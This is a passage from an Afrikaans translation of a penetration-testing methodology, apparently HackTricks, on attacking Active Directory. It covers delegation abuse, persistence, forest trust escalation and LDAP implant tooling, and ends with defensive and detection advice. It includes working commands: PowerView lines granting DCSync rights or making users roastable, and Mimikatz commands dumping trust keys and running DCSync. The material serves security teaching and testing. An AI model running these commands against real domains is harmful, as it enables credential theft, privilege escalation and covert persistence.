As 'n gebruiker voorregte het om toegang tot **MSSQL instances** te verkry, kan hy dit moontlik gebruik om **commands uit te voer** op die MSSQL-host (indien dit as SA loop), die NetNTLM **hash** te **steel** of selfs 'n **relay**-**attack** uit te voer.\
As 'n MSSQL-instance deur middel van 'n databasis-skakel deur 'n ander instance vertrou word, kan 'n gebruiker met voorregte oor die gekoppelde databasis moontlik **die trust relationship gebruik om queries op die ander instance uit te voer**. Hierdie trusts kan geketting word en kan uiteindelik 'n verkeerd gekonfigureerde databasis bereik waar die gebruiker commands kan uitvoer.\
**Die skakels tussen databasisse werk selfs oor forest trusts heen.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Derdeparty-inventaris- en deployment-suites stel dikwels kragtige paaie na credentials en code execution bloot. Sien:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

As jy enige Computer-object met die attribuut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) vind en jy domain privileges op die computer het, sal jy TGTs uit die geheue van elke gebruiker wat by die computer aanmeld, kan dump.\
Dus, as 'n **Domain Admin by die computer aanmeld**, sal jy sy TGT kan dump en hom kan impersonateer deur [Pass the Ticket](pass-the-ticket.md) te gebruik.\
Danksy constrained delegation kan jy selfs 'n **Print Server outomaties kompromitteer** (hopelik sal dit 'n DC wees).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

As 'n gebruiker of computer vir "Constrained Delegation" toegelaat word, sal dit **enige gebruiker kan impersonateer om toegang tot sekere services op 'n computer te verkry**.\
As jy dan die **hash van hierdie gebruiker/computer kompromitteer**, sal jy **enige gebruiker** (selfs domain admins) kan **impersonateer** om toegang tot sekere services te verkry.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

As jy **WRITE**-voorreg op 'n Active Directory-object van 'n afgeleë computer het, kan jy code execution met **verhoogde voorregte** verkry:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Die gekompromitteerde gebruiker kan sekere **interessante voorregte oor sommige domain-objects** hê wat jou kan toelaat om lateraal te **beweeg** of voorregte te **eskaleer**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

As jy 'n **Spool-service ontdek wat binne die domain luister**, kan dit **misbruik** word om nuwe credentials te **verkry** en voorregte te **eskaleer**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

As **ander gebruikers** toegang tot die **gekompromitteerde** machine verkry, is dit moontlik om credentials uit die geheue te **versamel** en selfs beacons in hul prosesse te **inject** om hulle te impersonateer.\
Gewoonlik kry gebruikers toegang tot die stelsel via RDP; hier is dus hoe om 'n paar attacks op derdeparty-RDP-sessies uit te voer:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** verskaf 'n stelsel vir die bestuur van die **plaaslike Administrator-wagwoord** op domain-joined computers, en verseker dat dit **gerandomiseer**, uniek en gereeld **verander** word. Hierdie wagwoorde word in Active Directory gestoor en toegang word deur ACLs tot slegs gemagtigde gebruikers beperk. Met voldoende permissions om toegang tot hierdie wagwoorde te verkry, word pivoting na ander computers moontlik.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Die **versameling van certificates** vanaf die gekompromitteerde machine kan 'n manier wees om voorregte binne die omgewing te eskaleer:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

As **kwesbare templates** gekonfigureer is, is dit moontlik om hulle te misbruik om voorregte te eskaleer:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Sodra jy **Domain Admin**- of, nog beter, **Enterprise Admin**-voorregte verkry, kan jy die **domain-databasis**: _ntds.dit_ **dump**.

[**Meer inligting oor die DCSync attack kan hier gevind word**](dcsync.md).

[**Meer inligting oor hoe om die NTDS.dit te steel, kan hier gevind word**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Sommige van die tegnieke wat vroeër bespreek is, kan vir persistence gebruik word.\
Jy kan byvoorbeeld:

- Gebruikers kwesbaar maak vir [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Gebruikers kwesbaar maak vir [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- [**DCSync**](#dcsync)-voorregte aan 'n gebruiker toestaan

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Die **Silver Ticket attack** skep 'n **legitieme Ticket Granting Service (TGS)-ticket** vir 'n spesifieke service deur die **NTLM-hash** te gebruik (byvoorbeeld die **hash van die PC-account**). Hierdie metode word gebruik om **toegang tot die service se voorregte te verkry**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

'n **Golden Ticket attack** behels dat 'n aanvaller toegang tot die **NTLM-hash van die krbtgt-account** in 'n Active Directory (AD)-omgewing verkry. Hierdie account is spesiaal omdat dit gebruik word om alle **Ticket Granting Tickets (TGTs)** te teken, wat noodsaaklik is vir authentication binne die AD-network.

Sodra die aanvaller hierdie hash verkry, kan hy **TGTs** vir enige account van sy keuse skep (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Dit is soortgelyk aan golden tickets wat op 'n manier vervals is wat **algemene golden tickets-detection mechanisms omseil.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**As jy certificates van 'n account het of dit kan aanvra**, is dit 'n baie goeie manier om persistence in die gebruiker se account te behou (selfs as hy die wagwoord verander):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Deur certificates te gebruik, is dit ook moontlik om persistence met hoë voorregte binne die domain te behou:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Die **AdminSDHolder**-object in Active Directory verseker die sekuriteit van **voorregtegroepe** (soos Domain Admins en Enterprise Admins) deur 'n standaard **Access Control List (ACL)** op hierdie groepe toe te pas om ongemagtigde veranderinge te voorkom. Hierdie funksie kan egter uitgebuit word; as 'n aanvaller die AdminSDHolder se ACL verander om volle toegang aan 'n gewone gebruiker te gee, verkry daardie gebruiker uitgebreide beheer oor alle voorregtegroepe. Hierdie sekuriteitsmaatreël, wat bedoel is om te beskerm, kan dus terugvuur en ongemagtigde toegang moontlik maak indien dit nie noukeurig gemonitor word nie.

[**Meer inligting oor AdminDSHolder Group hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Binne elke **Domain Controller (DC)** bestaan daar 'n **plaaslike administrator**-account. Deur admin-regte op so 'n machine te verkry, kan die plaaslike Administrator-hash met **mimikatz** onttrek word. Daarna is 'n registerwysiging nodig om **die gebruik van hierdie wagwoord te enable**, wat remote access tot die plaaslike Administrator-account moontlik maak.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Jy kan sekere **spesiale permissions** aan 'n **gebruiker** oor spesifieke domain-objects **gee**, wat die gebruiker sal toelaat om **in die toekoms voorregte te eskaleer**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **security descriptors** word gebruik om die **permissions** te **stoor** wat 'n **object** oor 'n ander **object** het. As jy net 'n **klein verandering** aan die **security descriptor** van 'n object kan **maak**, kan jy baie interessante voorregte oor daardie object verkry sonder om 'n lid van 'n voorregtegroep te wees.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Misbruik die `dynamicObject`-hulpklas om kortlewende principals/GPOs/DNS-records met `entryTTL`/`msDS-Entry-Time-To-Die` te skep; hulle verwyder hulself sonder tombstones, wat LDAP-bewyse uitwis terwyl verweesde SIDs, gebreekte `gPLink`-verwysings of gekasde DNS-antwoorde agtergelaat word (byvoorbeeld AdminSDHolder ACE-pollution of kwaadwillige `gPCFileSysPath`/AD-geïntegreerde DNS-redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verander **LSASS** in die geheue om 'n **universele wagwoord** daar te stel, wat toegang tot alle domain-accounts verleen.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Lees hier wat 'n SSP (Security Support Provider) is.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om die **credentials** wat gebruik word om toegang tot die machine te verkry, in **clear text** te **capture**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dit registreer 'n **nuwe Domain Controller** in die AD en gebruik dit om **attributes** (SIDHistory, SPNs...) op gespesifiseerde objects te **push** sonder om enige **logs** oor die **modifications** agter te laat. Jy **benodig DA**-voorregte en moet binne die **root domain** wees.\
Let daarop dat baie lelike logs sal verskyn as jy verkeerde data gebruik.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Ons het voorheen bespreek hoe om voorregte te eskaleer as jy **voldoende permission het om LAPS-wagwoorde te lees**. Hierdie wagwoorde kan egter ook gebruik word om **persistence te behou**.\
Sien:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft beskou die **Forest** as die sekuriteitsgrens. Dit impliseer dat **die kompromittering van 'n enkele domain moontlik daartoe kan lei dat die hele Forest gekompromitteer word**.<sup>[[1]](#references)</sup>

### Basic Information

'n [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is 'n sekuriteitsmeganisme wat 'n gebruiker van een **domain** in staat stel om toegang tot resources in 'n ander **domain** te verkry. Dit skep in wese 'n koppeling tussen die authentication-stelsels van die twee domains, waardeur authentication-verifikasies naatloos kan vloei. Wanneer domains 'n trust opstel, ruil hulle spesifieke **keys** uit en behou hulle dit binne hul **Domain Controllers (DCs)**; hierdie keys is noodsaaklik vir die integriteit van die trust.

In 'n tipiese scenario moet 'n gebruiker wat toegang tot 'n service in 'n **trusted domain** wil verkry, eers 'n spesiale ticket, bekend as 'n **inter-realm TGT**, van sy eie domain se DC aanvra. Hierdie TGT word geënkripteer met 'n gedeelde **key** waaroor beide domains ooreengekom het. Die gebruiker bied dan hierdie TGT aan die **DC van die trusted domain** om 'n service ticket (**TGS**) te verkry. Nadat die trusted domain se DC die inter-realm TGT suksesvol gevalideer het, reik dit 'n TGS uit wat die gebruiker toegang tot die service verleen.

**Stappe**:

1. 'n **client computer** in **Domain 1** begin die proses deur sy **NTLM-hash** te gebruik om 'n **Ticket Granting Ticket (TGT)** van sy **Domain Controller (DC1)** aan te vra.
2. DC1 reik 'n nuwe TGT uit indien die client suksesvol ge-authenticateer word.
3. Die client vra dan 'n **inter-realm TGT** van DC1 aan, wat nodig is om toegang tot resources in **Domain 2** te verkry.
4. Die inter-realm TGT word geënkripteer met 'n **trust key** wat tussen DC1 en DC2 gedeel word as deel van die tweerigting-domain trust.
5. Die client neem die inter-realm TGT na **Domain 2 se Domain Controller (DC2)**.
6. DC2 verifieer die inter-realm TGT met sy gedeelde trust key en reik, indien dit geldig is, 'n **Ticket Granting Service (TGS)** uit vir die server in Domain 2 waartoe die client toegang wil verkry.
7. Laastens bied die client hierdie TGS aan die server, wat met die server se account-hash geënkripteer is, om toegang tot die service in Domain 2 te verkry.

### Different trusts

Dit is belangrik om daarop te let dat **'n trust eenrigting of tweerigting kan wees**. In die tweerigting-opsie vertrou beide domains mekaar, maar in die **eenrigting**-trustverhouding sal een van die domains die **trusted** en die ander die **trusting** domain wees. In laasgenoemde geval sal jy **slegs vanaf die trusted domain toegang tot resources binne die trusting domain kan verkry**.

As Domain A Domain B vertrou, is A die trusting domain en B die trusted one. Verder sal dit in **Domain A** 'n **Outbound trust** wees; en in **Domain B** 'n **Inbound trust**.

**Verskillende trusting relationships**

- **Parent-Child Trusts**: Dit is 'n algemene opstelling binne dieselfde forest, waar 'n child domain outomaties 'n tweerigting-transitiewe trust met sy parent domain het. Dit beteken in wese dat authentication-versoeke naatloos tussen die parent en die child kan vloei.
- **Cross-link Trusts**: Ook bekend as "shortcut trusts", word dit tussen child domains opgestel om referral-prosesse te versnel. In komplekse forests moet authentication-referrals gewoonlik tot by die forest root en daarna af na die teikendomain beweeg. Deur cross-links te skep, word die roete verkort, wat veral voordelig is in geografies verspreide omgewings.
- **External Trusts**: Dit word tussen verskillende, onverwante domains opgestel en is van nature nie-transitief nie. Volgens [Microsoft se dokumentasie](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) is external trusts nuttig om toegang tot resources in 'n domain buite die huidige forest te verkry wat nie deur 'n forest trust verbind is nie. Sekuriteit word deur SID-filtering met external trusts versterk.
- **Tree-root Trusts**: Hierdie trusts word outomaties tussen die forest root domain en 'n nuut bygevoegde tree root opgestel. Hoewel hulle nie algemeen teëgekom word nie, is tree-root trusts belangrik om nuwe domain trees aan 'n forest te koppel, sodat hulle 'n unieke domain name kan behou en tweerigting-transitiwiteit kan verseker. Meer inligting is beskikbaar in [Microsoft se gids](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Hierdie tipe trust is 'n tweerigting-transitiewe trust tussen twee forest root domains, en dwing ook SID-filtering af om sekuriteitsmaatreëls te verbeter.
- **MIT Trusts**: Hierdie trusts word met nie-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos-domains opgestel. MIT trusts is meer gespesialiseerd en is gemik op omgewings wat integrasie met Kerberos-gebaseerde stelsels buite die Windows-ekosisteem vereis.

#### Ander verskille in **trusting relationships**

- 'n Trust relationship kan ook **transitief** wees (A trust B, B trust C, dan trust A vir C) of **nie-transitief**.
- 'n Trust relationship kan as 'n **bidirectional trust** opgestel word (beide vertrou mekaar) of as 'n **one-way trust** (slegs een van hulle vertrou die ander).

### Attack Path

1. **Enumerate** die trusting relationships
2. Kontroleer of enige **security principal** (user/group/computer) **toegang** tot resources van die **ander domain** het, moontlik deur ACE-inskrywings of deur lidmaatskap van groepe in die ander domain. Soek na **relationships across domains** (dit is waarskynlik waarom die trust geskep is).
1. Kerberoast kan in hierdie geval 'n verdere opsie wees.
3. **Kompromitteer** die **accounts** wat deur domains kan **pivot**.

Aanvallers kan op drie primêre maniere toegang tot resources in 'n ander domain verkry:

- **Local Group Membership**: Principals kan by plaaslike groepe op machines gevoeg word, soos die “Administrators”-groep op 'n server, wat hulle beduidende beheer oor daardie machine gee.
- **Foreign Domain Group Membership**: Principals kan ook lede van groepe binne die foreign domain wees. Die doeltreffendheid van hierdie metode hang egter van die aard van die trust en die omvang van die groep af.
- **Access Control Lists (ACLs)**: Principals kan in 'n **ACL** gespesifiseer word, veral as entiteite in **ACEs** binne 'n **DACL**, wat hulle toegang tot spesifieke resources gee. Vir diegene wat dieper in die werking van ACLs, DACLs en ACEs wil delf, is die whitepaper getiteld “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 'n onskatbare bron.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Jy kan **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** nagaan om foreign security principals in die domain te vind. Dit sal users/groups van **'n eksterne domain/forest** wees.

Jy kan dit in **Bloodhound** nagaan of powerview gebruik:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Ander maniere om domain trusts te enumerate:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Daar is **2 trusted keys**, een vir _Child --> Parent_ en nog een vir _Parent_ --> _Child_.\
> Jy kan die een wat deur die huidige domain gebruik word, met die volgende kry:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escaleer as Enterprise admin na die child/parent domain deur die trust met SID-History injection te misbruik:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Dit is noodsaaklik om te verstaan hoe die Configuration Naming Context (NC) uitgebuit kan word. Die Configuration NC dien as 'n sentrale bewaarplek vir konfigurasiedata oor 'n forest in Active Directory (AD)-omgewings. Hierdie data word na elke Domain Controller (DC) binne die forest gerepliseer, met writable DCs wat 'n writable kopie van die Configuration NC handhaaf. Om dit uit te buit, moet 'n mens **SYSTEM privileges on a DC** hê, verkieslik 'n child DC.

**Link GPO to root DC site**

Die Configuration NC se Sites-container bevat inligting oor die sites van alle domain-joined computers binne die AD forest. Deur met SYSTEM privileges op enige DC te werk, kan aanvallers GPOs aan die root DC-sites koppel. Hierdie aksie kan die root domain moontlik kompromitteer deur policies wat op hierdie sites toegepas word, te manipuleer.

Vir in-diepte inligting kan 'n mens navorsing oor [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) raadpleeg.<sup>[[12]](#references)</sup>

**Compromise any gMSA in the forest**

'n Aanvalsvektor behels die teiken van privileged gMSAs binne die domain. Die KDS Root key, wat noodsaaklik is vir die berekening van gMSAs se passwords, word binne die Configuration NC gestoor. Met SYSTEM privileges op enige DC is dit moontlik om toegang tot die KDS Root key te verkry en die passwords vir enige gMSA oor die hele forest te bereken.

Gedetailleerde ontleding en stap-vir-stap leiding kan gevind word by:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Aanvullende delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Bykomende eksterne navorsing: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Hierdie metode vereis geduld, terwyl daar gewag word vir die skepping van nuwe privileged AD objects. Met SYSTEM privileges kan 'n aanvaller die AD Schema wysig om aan enige gebruiker volledige beheer oor alle classes toe te ken. Dit kan lei tot ongemagtigde toegang tot en beheer oor nuutgeskepte AD objects.

Verdere leeswerk is beskikbaar by [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

Die ADCS ESC5-vulnerability teiken beheer oor Public Key Infrastructure (PKI)-objects om 'n certificate template te skep wat authentication as enige gebruiker binne die forest moontlik maak. Aangesien PKI-objects in die Configuration NC voorkom, stel die kompromittering van 'n writable child DC die uitvoering van ESC5-attacks moontlik.

Meer besonderhede kan gelees word in [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> In scenarios sonder ADCS het die aanvaller die vermoë om die nodige components op te stel, soos bespreek in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In hierdie scenario word **jou domain vertrou** deur ’n eksterne een wat jou **onbepaalde permissions** daaroor gee. Jy sal moet vasstel **watter principals van jou domain watter access oor die eksterne domain het** en dit dan probeer uitbuit:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - Eenrigting (Uitgaande)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In hierdie scenario vertrou **jou domein** sommige **privileges** toe aan ’n principal uit ’n **ander domein**.

Wanneer ’n **domein vertrou word** deur die trusting domain, **skep die trusted domain ’n gebruiker** met ’n **voorspelbare naam** wat die **trusted password** as **wagwoord** gebruik. Dit beteken dat dit moontlik is om **toegang tot ’n gebruiker van die trusting domain te verkry om die trusted domain binne te gaan**, dit te enumerate en te probeer om meer privileges te eskaleer:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Nog ’n manier om die trusted domain te kompromitteer, is om ’n [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) te vind wat in die **teenoorgestelde rigting** van die domain trust geskep is, hoewel dit nie baie algemeen is nie.

Nog ’n manier om die trusted domain te kompromitteer, is om op ’n masjien te wag waar ’n **gebruiker van die trusted domain toegang het** om via **RDP** aan te meld. Die aanvaller kan dan kode in die RDP-sessieproses inject en van daar af **toegang tot die oorspronklike domein van die slagoffer verkry**.\
Verder, indien die **slagoffer sy hardeskyf gemount het**, kan die aanvaller vanuit die **RDP-sessie**-proses **backdoors** in die **startup folder van die hardeskyf** stoor. Hierdie tegniek word **RDPInception** genoem.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigation van domain trust abuse

### **SID Filtering:**

- Die risiko van attacks wat die SID history attribute oor forest trusts benut, word deur SID Filtering verminder. Dit word by verstek op alle inter-forest trusts geaktiveer. Dit berus op die aanname dat intra-forest trusts veilig is, aangesien die forest, eerder as die domain, volgens Microsoft se standpunt as die security boundary beskou word.
- Daar is egter ’n probleem: SID filtering kan toepassings en gebruikertoegang ontwrig, wat daartoe lei dat dit soms gedeaktiveer word.

### **Selective Authentication:**

- Vir inter-forest trusts verseker Selective Authentication dat gebruikers van die twee forests nie outomaties geauthentiseer word nie. In plaas daarvan word eksplisiete permissions benodig vir gebruikers om toegang tot domains en servers binne die trusting domain of forest te verkry.
- Dit is belangrik om daarop te let dat hierdie maatreëls nie beskerm teen die exploitation van die writable Configuration Naming Context (NC) of attacks op die trust account nie.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse from On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) herimplementeer bloodyAD-styl LDAP-primitives as x64 Beacon Object Files wat volledig binne ’n on-host implant (bv. Adaptix C2) loop. Operators compileer die pack met `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laai `ldap.axs`, en roep dan `ldap <subcommand>` vanaf die beacon aan. Alle traffic gebruik die huidige logon security context oor LDAP (389) met signing/sealing, of LDAPS (636) met outomatiese certificate trust, sodat geen socks proxies of disk artifacts benodig word nie.<sup>[[4]](#references)</sup>

### LDAP-enumeration aan die implant-kant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` en `get-groupmembers` resolve short names/OU paths na volledige DNs en dump die ooreenstemmende objects.
- `get-object`, `get-attribute` en `get-domaininfo` haal arbitrêre attributes, insluitend security descriptors, sowel as die forest/domain metadata vanaf `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` en `get-rbcd` wys roasting candidates, delegation settings en bestaande [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)-descriptors direk vanaf LDAP.
- `get-acl` en `get-writable --detailed` parse die DACL om trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) en inheritance te lys, wat onmiddellike targets vir ACL privilege escalation verskaf.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP-skryfprimitiewe vir eskalasie en persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) laat die operator nuwe principals of masjienrekeninge voorberei waar OU-regte bestaan. `add-groupmember`, `set-password`, `add-attribute`, en `set-attribute` kaap teikens direk sodra write-property-regte gevind word.
- ACL-gefokusde commands soos `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, en `add-dcsync` vertaal WriteDACL/WriteOwner op enige AD-object na password resets, beheer oor group membership, of DCSync-replikasievoorregte sonder om PowerShell/ADSI-artifacts agter te laat. `remove-*`-teenhangers verwyder geïnjekteerde ACEs.

### Delegation, roasting, en Kerberos abuse

- `add-spn`/`set-spn` maak ’n gekompromitteerde gebruiker onmiddellik Kerberoastable; `add-asreproastable` (UAC-toggle) merk dit vir AS-REP roasting sonder om aan die password te raak.
- Delegation-makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) herskryf `msDS-AllowedToDelegateTo`, UAC-flags, of `msDS-AllowedToActOnBehalfOfOtherIdentity` vanaf die beacon, wat constrained/unconstrained/RBCD-aanvalspaaie moontlik maak en die behoefte aan remote PowerShell of RSAT uitskakel.

### sidHistory-injection, OU-herlokasie, en shaping van die attack surface

- `add-sidhistory` injekteer bevoorregte SIDs in ’n beheerde principal se SID history (sien [SID-History Injection](sid-history-injection.md)), wat stealthy access inheritance volledig oor LDAP/LDAPS bied.
- `move-object` verander die DN/OU van computers of users, sodat ’n aanvaller bates kan verskuif na OUs waar delegated rights reeds bestaan voordat `set-password`, `add-groupmember`, of `add-spn` misbruik word.
- Streng begrensde removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ens.) maak ’n vinnige rollback moontlik nadat die operator credentials of persistence verkry het, wat telemetry minimaliseer.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Enkele algemene verdedigingstegnieke

[**Leer hier meer oor hoe om credentials te beskerm.**](../stealing-credentials/credentials-protections.md)

### **Defensiewe maatreëls vir credential-beskerming**

- **Domain Admins-beperkings**: Dit word aanbeveel dat Domain Admins slegs toegelaat word om by Domain Controllers aan te meld, sodat hulle nie op ander hosts gebruik word nie.
- **Service Account-voorregte**: Services behoort nie met Domain Admin (DA)-voorregte uitgevoer te word nie, om sekuriteit te handhaaf.
- **Tydelike beperking van voorregte**: Vir take wat DA-voorregte vereis, behoort die duur daarvan beperk te word. Dit kan bereik word met: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay-mitigering**: Oudit Event IDs 2889/3074/3075 en dwing daarna LDAP signing plus LDAPS channel binding op DCs/clients af om LDAP MITM/relay-pogings te blokkeer.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protokolvlak-fingerprinting van Impacket-aktiwiteit

As jy algemene AD tradecraft wil opspoor, **moenie slegs op operator-beheerde artifacts staatmaak nie**, soos hernoemde binaries, service names, tydelike batch-lêers, of output paths. Stel ’n baseline op van hoe legitieme Windows-clients [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, en WMI-verkeer opbou, en soek dan na **implementation quirks** wat bly bestaan selfs nadat die operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, of `ntlmrelayx.py` gewysig het.<sup>[[8]](#references)</sup>

- **Hoë-vertroue standalone-kandidate** (nadat dit teen jou eie baseline gevalideer is):
- Geauthentiseerde DCE/RPC met `auth_context_id = 79231 + ctx_id`
- DCE/RPC-authentication padding gevul met `0xff`
- LDAP Kerberos binds wat ’n rou Kerberos `AP-REQ` direk in SPNEGO `mechToken` plaas
- SMB2/3-negotiate requests met ASCII-agtige `ClientGuid`-waardes
- WMI `IWbemLevel1Login::NTLMLogin` wat die nie-standaard namespace `//./root/cimv2` gebruik
- Hardcoded Kerberos nonce-waardes
- **Beter as correlation/scoring features**:
- Sparse of gedupliseerde Kerberos-etype-lyste, ongewone/ontbrekende `PA-DATA`, of TGS-REQ-etype-ordering wat van native Windows verskil
- NTLM Type 1-boodskappe wat version info ontbreek, of Type 3-boodskappe met null host names
- Rou NTLMSSP wat in DCE/RPC gedra word in plaas van SPNEGO, ontbrekende DCE/RPC-verification trailers, of SPNEGO/Kerberos OID-mismatches
- Verskeie van hierdie eienskappe vanaf dieselfde host/user/session/time window is veel sterker as enige enkele swak field
- **Gebruik as enrichment, nie as standalone alerts nie**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, en tool-specific HTTP/WebDAV/RDP/MSSQL-strings
- Dit is maklik vir operators om te verander en word die beste gebruik om te verduidelik waarom ’n cross-protocol cluster verdag is
- **Operational notes**:
